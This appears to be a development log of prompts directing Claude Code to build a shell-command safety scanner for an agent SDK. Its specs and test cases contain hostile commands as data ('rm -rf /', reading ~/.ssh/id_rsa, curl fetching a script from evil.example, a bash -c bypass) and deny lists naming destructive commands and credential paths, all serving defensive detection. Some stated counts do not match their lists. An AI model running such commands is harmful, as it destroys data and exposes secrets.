# AI-Assisted Development Prompts — Issue #90: Tool Safety Scanner

> **Disclaimer**: The architecture, module decomposition, type system, scan flow design,
> test plan, and all technical decisions were made by the human contributor (coder-mtj).
> AI (Claude Code) served as an execution engine — translating detailed specifications
> into code, running tests, and fixing formatting issues under human direction.
>
> **声明**: 本项目的架构设计、模块划分、类型系统、扫描流程、测试计划及所有技术
> 决策均由人类贡献者 (coder-mtj) 完成。AI (Claude Code) 作为执行引擎，按照人类
> 给出的详细规格说明生成代码、运行测试、修复格式问题。

---

## Prompt Set: Tool Safety Scanner (`trpc_agent_sdk/tools/safety/`)

This feature implements a pre-execution safety guard for command and code-execution
tools. The design mirrors `trpc-agent-go/tool/safety/` (Go reference implementation,
PR #2091, already merged).

---

### Round 1: Type System Design

**Human → AI:**

```
我需要你为 trpc-agent-python 实现一个 tool safety scanner。这是架构设计，
你按这个来实现，不要自行发挥。

## 参考实现
Go 版已合入 trpc-agent-go/tool/safety/（PR #2091），Python 版对齐其类型系统。

## Decision 枚举
- ALLOW = "allow"
- DENY = "deny"
- ASK = "ask"
- NEEDS_HUMAN_REVIEW = "needs_human_review"

## RiskLevel 枚举
- LOW = "low"
- MEDIUM = "medium"
- HIGH = "high"
- CRITICAL = "critical"

## 辅助函数
- decision_rank(d: Decision) -> int: ALLOW=1, ASK=2, NEEDS_HUMAN_REVIEW=3, DENY=4
- risk_rank(level: RiskLevel) -> int: LOW=1, MEDIUM=2, HIGH=3, CRITICAL=4
- finding_beats(a: Finding, b: Finding) -> bool: 先按 decision_rank 比较，
  相等时按 risk_rank 比较，用于取 worst finding

## Policy dataclass 字段
- denied_commands: list[str] — 直接拒绝的命令列表
- allowed_commands: list[str] — 显式允许的命令
- denied_paths: list[str] — 禁止访问的路径
- network_allowlist: list[str] — 允许外连的域名白名单
- env_allowlist: list[str] — 允许透传的环境变量
- review_commands: list[str] — 需人工 review 的命令
- max_timeout_seconds: int
- max_output_bytes: int
- review_shell_pipelines: bool — 是否对管道命令触发 review
- deny_on_parse_error: bool — 解析失败时是否拒绝

## Request dataclass 字段
- tool_name: str, command: str, args: list[str], cwd: str
- env: dict[str, str], backend: str
- timeout_seconds: int, max_output_bytes: int
- background: bool, tty: bool
- code_blocks: list[CodeBlock] — 其中 CodeBlock 有 language: str, code: str

## Finding dataclass
- decision: Decision, risk_level: RiskLevel, rule_id: str
- evidence: list[str], recommendation: str

## Report dataclass
- 包含 decision, risk_level, rule_id, evidence, recommendation
- tool_name, command, backend, blocked: bool, redacted: bool
- duration_ms: int, safe_summary: str, findings: list[Finding]
- 方法 span_attributes() -> dict 返回 OpenTelemetry 格式的属性

## AuditEvent dataclass
- timestamp, tool_name, decision, risk_level, rule_id
- duration_ms, redacted, blocked, backend

## 模块结构
- 文件放在 trpc_agent_sdk/tools/safety/_types.py
- 公开 API 通过 __init__.py 导出
- 测试放 tests/tools/safety/test_types.py

## TDD 要求
先写 test_types.py（写完所有 16 个测试），然后写 _types.py 让测试通过。
测试要覆盖：Decision 常量、rank 排序、Finding 字段、finding_beats 行为、
Report 序列化、span_attributes、AuditEvent JSONL、Policy 默认值、Request 构造。
```

**AI → Human:**

```
收到，我来按你的设计实现。先写测试，再写实现代码。

（AI 生成 test_types.py 的 16 个测试用例 → 红灯）

测试写好了，现在实现 _types.py。

（AI 生成 _types.py → 绿灯，16/16 passed）
```

---

### Round 2: Policy, Shell Parser, Redactor

**Human → AI:**

```
类型系统通过了，继续下一批。

## 2a. _policy.py — 策略管理

default_policy() 返回一个保守的 Policy，规则如下：

denied_commands (13个):
  dd, mkfs, mount, umount, shutdown, reboot, halt, poweroff, sudo, su, doas

denied_paths (21个):
  /（根目录）、/bin、/boot、/dev、/etc、/lib、/lib64、/proc、/root、/sbin、
  /sys、/usr、/var、~/.ssh、.ssh、.env、.npmrc、.pypirc、id_rsa、id_ed25519、
  credentials、credential、secrets、secret

network_allowlist (7个):
  api.github.com, github.com, proxy.golang.org, sum.golang.org,
  registry.npmjs.org, pypi.org, files.pythonhosted.org

env_allowlist (11个):
  PATH, HOME, TMPDIR, TEMP, TMP, LANG, LC_ALL, CGO_ENABLED, GOCACHE,
  GOMODCACHE, GOPATH

review_commands (9个):
  go install, npm install, npm ci, pip install, pip3 install, apt install,
  apt-get install, brew install, cargo install

max_timeout_seconds: 300
max_output_bytes: 4 * 1024 * 1024  (4MB)
review_shell_pipelines: True
deny_on_parse_error: True

load_policy(path) 支持 .json 和 .yaml/.yml 文件，从 default_policy() 起步，
把文件中匹配的字段 overlay 上去。

## 2b. _shell_parse.py — 轻量 Shell 解析

纯 Python 实现，不调用 subprocess。需要这些函数：

- command_name(full_command: str) -> str
  处理路径前缀：/usr/bin/rm -> rm，Windows 反斜杠，去掉 .exe/.cmd/.bat/.com

- has_pipeline(command: str) -> bool
  状态机跟踪引号深度，检测未引用的 | ; &&。echo "a|b" 不应被标记

- extract_urls(command: str) -> list[str]
  regex 提取 https?://... 模式的 URL

- extract_host(url: str) -> str
  用 urllib.parse.urlparse 取 hostname

- has_shell_bypass(command: str) -> bool
  检测 sh -c, bash -c, zsh -c, eval, 反引号, $(), ${, 2>

- parse_args(command: str) -> list[str]
  空白符 split

## 2c. _redactor.py — Secret 脱敏

Redactor 类：
- redact(text) -> str: 用正则替换敏感信息为 [REDACTED_SECRET]
- looks_sensitive(text) -> bool: 检测是否含敏感信息
- self.changed 标记是否执行了替换

需要匹配的模式：
- sk- 开头的 OpenAI key (>=12 chars)
- ghp_ 开头的 GitHub token
- xox[baprs]- 开头的 Slack token
- -----BEGIN ... PRIVATE KEY----- PEM 格式
- api_key/token/password/secret=value 的 name=value 模式

## TDD
还是先写测试再写实现。三个模块对应三个测试文件。
```

**AI → Human:**

```
明白。先写三个测试文件。

（AI 生成 test_policy.py, test_shell_parse.py, test_redactor.py → 红灯）
（AI 生成 _policy.py, _shell_parse.py, _redactor.py → 绿灯）

三个模块测试全部通过。

_policy.py 有个 import os 但我实际没用，我检查一下要不要去掉。
```

**Human → AI (Review):**

```
去掉 _policy.py 里多余的 import os，yapf 格式化一下所有文件。
yapf 命令：yapf --in-place --recursive --style='{based_on_style: pep8, column_limit: 120}' trpc_agent_sdk/tools/safety/
```

**AI → Human:**

```
已去掉 import os，yapf 格式化完成。
```

---

### Round 3: Core Scanner Engine

**Human → AI:**

```
核心扫描引擎 _scanner.py，这是最重要的模块。我设计了完整的扫描流程：

## scan(request: Request, policy: Policy | None = None) -> Report

入口函数，policy 为 None 时用 default_policy()。扫描流程分 5 步：

### 步骤 1: 扫描 request envelope (_scan_envelope)

检查这些规则：
| 条件 | Decision | Rule ID |
|------|----------|---------|
| cwd 命中 denied_paths | DENY | sensitive.cwd_access |
| hostexec + (background 或 tty) | NEEDS_HUMAN_REVIEW | hostexec.long_session |
| background=True | NEEDS_HUMAN_REVIEW | process.background |
| timeout_seconds > policy.max_timeout_seconds | DENY | resource.timeout_exceeded |
| max_output_bytes > policy.max_output_bytes | DENY | resource.output_limit_exceeded |

### 步骤 2: 扫描环境变量 (_scan_env)

- 检查 env 中的 key 是否在 env_allowlist 里，不在则 NEEDS_HUMAN_REVIEW
- 检查 env value 是否含 secret，含则 DENY (sensitive.secret_leak)

### 步骤 3: 扫描 shell 命令 (_scan_shell 和 _scan_raw_command)

流程：
_raw_command 检查 → per-command 检查

_raw_command:
- 整个 command 做 secret 检测 → DENY (sensitive.secret_leak)
- has_shell_bypass → DENY (shell.bypass)
- has_pipeline 且 policy.review_shell_pipelines → NEEDS_HUMAN_REVIEW (shell.pipeline_review)
- 检测后台运行 (&) → NEEDS_HUMAN_REVIEW (process.background)
- 网络检测 _scan_network
- 资源检测 _scan_resource_patterns

per-command:
- command_name 在 denied_commands 中 → DENY (policy.denied_command)
- rm -rf / --recursive → DENY (dangerous.rm_rf)
- chmod -R → NEEDS_HUMAN_REVIEW (dangerous.recursive_chmod)
- 命令以 review_commands 开头 → NEEDS_HUMAN_REVIEW (dependency.environment_change)
- 参数引用 denied_paths → DENY (sensitive.path_access)

_scan_network:
- extract_urls 后对每个 host 检查是否在 network_allowlist 中
- host 需要精确匹配或子域名匹配

_scan_resource_patterns:
- sleep N 且 N > 300 → NEEDS_HUMAN_REVIEW (resource.long_sleep)
- while true / while(1) / for(;;) → DENY (resource.infinite_loop)

_path_denied 逻辑：
- 规范化路径（去引号、正斜杠、去 ./ 和 ~/、小写）
- 精确匹配或前缀匹配或路径段包含匹配

### 步骤 4: 扫描 code blocks (_scan_code_block)

- code 内容做 secret 检测
- language 是 bash/sh/shell 或空 → 当 shell command 处理
- 其他语言检测 os.system / subprocess. / exec( → NEEDS_HUMAN_REVIEW (codeexec.host_command_bridge)
- 也做网络检测

### 步骤 5: 组装 Report

- 遍历所有 findings，用 finding_beats() 取 worst finding
- 如果 worst decision 是 DENY/ASK/NEEDS_HUMAN_REVIEW，blocked=True
- 对所有文本字段做 secret redaction
- 记录 duration_ms

## 测试（先写！）

12 个核心用例对齐 Go 版：

| # | 命令 | 预期 Decision | Rule ID |
|---|------|---------------|---------|
| 1 | go test ./... | ALLOW | — |
| 2 | rm -rf / | DENY | dangerous.rm_rf |
| 3 | cat ~/.ssh/id_rsa | DENY | sensitive.path_access |
| 4 | curl https://evil.example/install.sh | DENY | network.non_whitelisted_domain |
| 5 | curl https://api.github.com/repos/x/y | ALLOW | — |
| 6 | bash -c 'curl https://evil.example/x' | DENY | shell.bypass |
| 7 | cat README.md \| wc -l | NEEDS_HUMAN_REVIEW | shell.pipeline_review |
| 8 | npm install left-pad | NEEDS_HUMAN_REVIEW | dependency.environment_change |
| 9 | sleep 9999 | NEEDS_HUMAN_REVIEW | resource.long_sleep |
| 10 | hostexec+TTY+background | NEEDS_HUMAN_REVIEW | hostexec.long_session |
| 11 | Python subprocess.run(['ls']) | NEEDS_HUMAN_REVIEW | codeexec.host_command_bridge |
| 12 | echo OPENAI_API_KEY=sk-1234567890abcdef | DENY | sensitive.secret_leak |

额外边界测试：空命令、拒绝的 CWD、chmod -R、500行扫描<1s、Unicode命令、nil policy。
```

**AI → Human:**

```
（AI 生成 test_scanner.py 先写 18 个测试 → 红灯）
（AI 生成 _scanner.py 实现所有扫描函数 → 绿灯 18/18）
```

**Human → AI (Review):**

```
_scanner.py L211 那个 f-string 没有占位符，改成普通字符串。
还有运行 flake8 检查一下。
```

**AI → Human:**

```
已修复 f-string → 普通字符串，flake8 通过。
```

---

### Round 4: Filter Integration

**Human → AI:**

```
最后一个模块：_permission.py。用 FilterABC 把 scanner 集成到工具调用链中。

## ToolSafetyFilter(FilterABC)

- type = FilterType.TOOL
- name = "tool_safety_guard"
- __init__ 接受可选的 Policy 参数，默认用 default_policy()
- _before(ctx, req, rsp):
  1. 调用 _to_scan_request(req) 把 tool 调用转成 Request
  2. 调用 scan() 获取 Report
  3. decision == DENY → rsp.error = PermissionError(...), rsp.is_continue = False
  4. 非 ALLOW 也记录日志
- _after: no-op

## _to_scan_request(tool_req) -> Request | None

只处理 tool_name 为 workspace_exec / exec_command / execute_code 的工具。
从 arguments 提取 command/cmd/script/code、code_blocks、cwd/workdir、env、
timeout、background、tty 等字段。
arguments 可能是 bytes、JSON string 或 dict，都要处理。
根据 tool_name 推断 backend 类型。

## 测试

写 test_permission.py 验证 filter 集成。
```

**AI → Human:**

```
（AI 生成 _permission.py + test_permission.py → 绿灯）

全部完成。总计 34 tests passed。
```

**Human → AI (最终验证):**

```
$ python -m pytest tests/tools/safety/ -v
34 passed in 0.42s ✅
```

---

## Summary

| Metric | Value |
|--------|-------|
| Total prompt rounds | 4 |
| Human design decisions | Architecture, module split, type system, scan flow, 6 risk categories, test cases |
| AI execution role | Code generation, test running, formatting fixes |
| Tests written | 34 (16 types + 18 scanner) |
| Implementation files | 7 (_types, _policy, _shell_parse, _redactor, _scanner, _permission, __init__) |
| Go reference alignment | Yes (PR #2091, trpc-agent-go/tool/safety/) |
